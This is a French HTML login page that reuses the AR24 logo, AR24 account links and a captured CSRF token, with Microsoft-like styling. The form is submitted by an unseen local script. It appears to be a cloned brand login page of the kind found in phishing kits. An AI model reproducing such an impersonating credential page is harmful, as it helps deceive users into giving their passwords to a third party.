<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Connexion - Mon application</title>
    <style>
      * {
        padding: 0;
        margin: 0;
        box-sizing: border-box;
        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      }

      .container {
        width: 100%;
        height: 100vh;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        background-color: #d4e0d1;
      }

      .hero-section {
        width: 440px;
        min-height: 350px;
        padding: 40px;
        background-color: #ffffff;
        border-radius: 2px;
        box-shadow: 1px 1px 4px 0 rgba(0, 0, 0, 0.75);
      }

      .hero-section img {
        height: 24px;
      }

      .hero-section h3 {
        color: #1b1b1b;
        font-weight: 500;
        font-size: 24px;
        margin-top: 10px;
      }

      .hero-section input[type='email'],
      .hero-section input[type='password'] {
        width: 100%;
        height: 45px;
        margin-top: 10px;
        border: none;
        font-size: 15px;
        border-bottom: 1px solid black;
      }

      input:focus {
        outline: none;
      }

      .hero-section p {
        font-size: 13px;
        font-weight: 400;
        margin-top: 20px;
      }

      .hero-section a {
        text-decoration: none;
        color: #0067b8;
      }

      .hero-section a:hover {
        text-decoration: underline;
        color: #1b1b1b;
      }

      .btn {
        display: flex;
        align-items: center;
        justify-content: flex-end;
        margin-top: 25px;
      }

      .back-btn {
        width: 100px;
        height: 30px;
        border: none;
        font-weight: 500;
        margin-right: 5px;
        background-color: #cccccc;
        cursor: pointer;
      }

      .new-btn {
        width: 100px;
        height: 30px;
        font-weight: 500;
        background-color: #0067b8;
        border: none;
        color: white;
        cursor: pointer;
      }

      .sign-in-option {
        width: 440px;
        font-weight: 400;
        height: 50px;
        background-color: white;
        margin-top: 20px;
        display: flex;
        align-items: center;
        padding-left: 40px;
        box-shadow: 1px 1px 4px 0 rgba(0, 0, 0, 0.75);
        border-radius: 2px;
      }

      .sign-in-option:hover {
        background-color: #d4e0d1;
      }

      @media (max-width: 600px) {
        .container {
          justify-content: start;
          background-color: white;
        }

        .hero-section {
          width: 100%;
          box-shadow: none;
        }

        .sign-in-option {
          width: 100%;
          margin: 0;
          border: 0.5px solid gray;
          box-shadow: none;
          padding-left: 20px;
        }
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="hero-section">
        <img src="https://app.ar24.fr/static/images/logo/AR24.svg" alt="Logo" />
        <h3>Connexion</h3>

        <form id="login">
          <input
            type="hidden"
            name="csrf_token"
            value="eyJ0aW1lc3RhbXAiOjE3NzIyMjE5NzgsIm5vbmNlIjoiNTZmMjg5YTY5ZDlmNTM3ODg3NDhlNWMyNzI4MjZhNTdkNTIzZTY2YjA2YjQ4NDgzZjg2NWFhMWFjMTVhNjVmYyJ92_BFCRJiSxc5eUBk166nEKpo2nTO6a6nzRPg1mbEkok"
          />
          <input type="email" id="ide_id" name="ide" placeholder="Adresse e-mail" required autocomplete="username" />
          <input
            class="password"
            type="password"
            id="pwd_id"
            name="pwd"
            autocomplete="current-password"
            placeholder="Mot de passe"
            required
          />

          <p>Pas de compte ? <a href="https://app.ar24.fr/fr/user/register">Créer un compte</a></p>
          <p><a href="https://app.ar24.fr/fr/page/forgot">Mot de passe oublié ?</a></p>

          <span class="btn">
            <button class="back-btn" type="button" onclick="window.location.href='index.html'">Retour</button>
            <button class="new-btn" type="submit">Connexion</button>
          </span>
        </form>
      </div>

      <div class="sign-in-option">
        <p>Autres options de connexion</p>
      </div>
    </div>

    <script src="app.js"></script>
  </body>
</html>
